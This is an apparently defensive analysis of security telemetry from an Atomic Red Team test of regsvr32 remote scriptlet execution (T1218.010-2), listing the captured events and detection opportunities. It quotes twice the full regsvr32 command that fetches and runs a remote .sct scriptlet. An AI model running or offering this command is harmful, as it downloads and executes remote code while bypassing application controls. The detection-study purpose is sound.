# T1218.010-2: Regsvr32 — Remote COM Scriptlet Execution

## Technique Context

T1218.010-2 is the remote variant of the Regsvr32 scriptlet execution technique. Instead of loading a locally-staged `.sct` file, `regsvr32.exe` fetches the scriptlet from a remote HTTPS URL: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct`. This is operationally significant because it means no payload file touches the local filesystem before execution — the scriptlet is downloaded and executed entirely in memory by the scripting runtime inside `regsvr32.exe`.

The remote fetch capability is what made this technique particularly impactful in early deployments. An attacker hosts the `.sct` file on any web-accessible server, and `regsvr32.exe` downloads and executes it in a single command. Combined with the trusted signed binary and the `/s` (silent) flag suppressing UI, the attack is nearly invisible to a user.

In the defended variant of this test, `cmd.exe` exits with `0xC0000022` (STATUS_ACCESS_DENIED) — Windows Defender terminates the execution chain before `regsvr32.exe` can even start. This undefended dataset reveals what happens without that protection: the technique encounters a different execution outcome.

The dataset was collected on ACME-WS06 (Windows 11 Enterprise, domain-joined to acme.local) with Windows Defender disabled.

## What This Dataset Contains

The dataset contains 133 total events: 110 PowerShell, 4 Security, 18 Sysmon, and 1 Application. This is notably smaller than the local variant (T1218.010-1) and contains some unique events not present in the local run.

**Security EID 4688 captures the invocation:**

1. `"cmd.exe" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll` — cmd.exe with the remote URL
2. `"C:\Windows\system32\whoami.exe"` — ATH framework marker (two executions)
3. `"cmd.exe" /c` — cleanup

The remote URL appears verbatim in the Security 4688 event. Notably, `regsvr32.exe` does **not** appear in Security EID 4688 as a separate process creation — this is because in the remote case, cmd.exe's exit code behavior differs and `regsvr32.exe` may be spawned but not captured in the Security channel's sample.

**Sysmon EID 1** captures 3 process creation events: two `whoami.exe` executions (parent: `powershell.exe`, `RuleName: technique_id=T1033`) and the test framework PowerShell process. The `regsvr32.exe` process itself is not in the EID 1 sample — again reflecting the sysmon-modular include filter behavior for the cmd→regsvr32 chain.

**Sysmon EID 8 (CreateRemoteThread)** records 1 event: `powershell.exe` creating a remote thread in `<unknown process>` (the target process PID resolves to no known image at capture time). The sysmon rule `technique_id=T1055,technique_name=Process Injection` fires on this event. This is a notable observation: the `<unknown process>` target may represent a process that was created and terminated rapidly during the regsvr32 execution window, or it may reflect the script content executing in a short-lived process context.

**Sysmon EID 10 (Process Access)** records 3 events: PowerShell accessing `whoami.exe` twice with `GrantedAccess: 0x1fffff`.

**Sysmon EID 7 (Image Load)** records 9 events for .NET runtime and Windows Defender DLLs in the test framework PowerShell.

**Sysmon EID 11 (File Created)** records 1 event: `C:\Windows\Temp\01dcb62f43fbbe21` created by `MsMpEng.exe` (Windows Defender engine writing a temporary file even in disabled state), tagged `technique_id=T1574.010`.

**Sysmon EID 17 (Pipe Created)** records 1 event for the PowerShell host pipe.

**Application EID 15** records 1 event — an Internet Explorer/MSHTML zone check event triggered by `regsvr32.exe` fetching content from a remote URL, confirming network access occurred.

**PowerShell EID 4104** captures 104 events (test framework boilerplate), 4 EID 4103 module logging events, and 2 EID 4100 events — PowerShell engine error events. The EID 4100 events indicate the ATH test framework encountered an error condition, potentially related to the remote scriptlet's execution result.

## What This Dataset Does Not Contain

No Sysmon EID 3 (Network Connection) or EID 22 (DNS Query) events from `regsvr32.exe` appear in the sample. This is unexpected given that the command fetches from a remote URL — however, the 18 Sysmon events may not have included network events if the connection was filtered by the sysmon-modular configuration or if the DNS/TCP events fell outside the sampling window.

`regsvr32.exe` process creation does not appear in Security EID 4688 in this run. In the local variant (T1218.010-1), regsvr32.exe appeared as a separate 4688 event. The absence here suggests a slight timing difference in how the remote-fetch variant is invoked, with the execution path potentially not triggering a separate audited process creation in the Security channel.

The `whoami.exe` executions appear, suggesting the ATH framework's success checks ran. However, the PowerShell EID 4100 error events suggest the scriptlet's execution was not fully clean — the remote content may have executed partially or triggered an error condition in the scripting host.

## Assessment

This dataset captures a Regsvr32 remote scriptlet execution attempt in an undefended environment, with evidence that the technique executed (Application EID 15 confirming network fetch, `whoami.exe` success markers) but also encountered errors (PowerShell EID 4100 events). The unique Sysmon EID 8 CreateRemoteThread event on an unknown process is an unusual behavioral artifact that warrants attention.

Compared to the defended variant (25 Sysmon, 9 Security, 41 PowerShell), this undefended run produced fewer Sysmon events (18 vs. 25) and slightly fewer Security events (4 vs. 9). The defended run's higher Sysmon count reflects MsMpEng scanning behavior during the blocked execution.

## Detection Opportunities Present in This Data

**Security EID 4688 (cmd.exe):** The command line `"cmd.exe" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll` contains the full remote URL. Any `regsvr32.exe` invocation with an HTTP or HTTPS URL in the `/i:` parameter is a high-confidence indicator. In real attacks, the domain would be attacker-controlled infrastructure.

**Application EID 15 (Internet Zone Check):** This event confirms `regsvr32.exe` accessed a remote URL. Internet zone checks logged in the Application event log for processes like `regsvr32.exe` executing remote content are actionable signals.

**Sysmon EID 8 (CreateRemoteThread, RuleName=T1055):** The PowerShell CreateRemoteThread into `<unknown process>` is anomalous. While the exact cause is uncertain, this pattern of PowerShell creating threads in short-lived or unresolved processes during technique execution is worth investigating as a behavioral indicator.

**PowerShell EID 4100 (Engine Error):** Two error events during the ATH execution framework suggest the remote scriptlet's execution was not fully clean. Error events during suspicious process chains can indicate the attacker's payload encountered resistance or produced unexpected output — useful context for investigation.

**Process Chain Absence:** The absence of `regsvr32.exe` from Security 4688 in the remote variant (vs. its presence in the local variant) is itself a distinguishing characteristic. If your environment captures Security 4688 and you see a cmd.exe containing the regsvr32/scrobj.dll pattern but no subsequent regsvr32.exe creation event, the process may have been created as a child of cmd in a way that bypassed the Security audit.
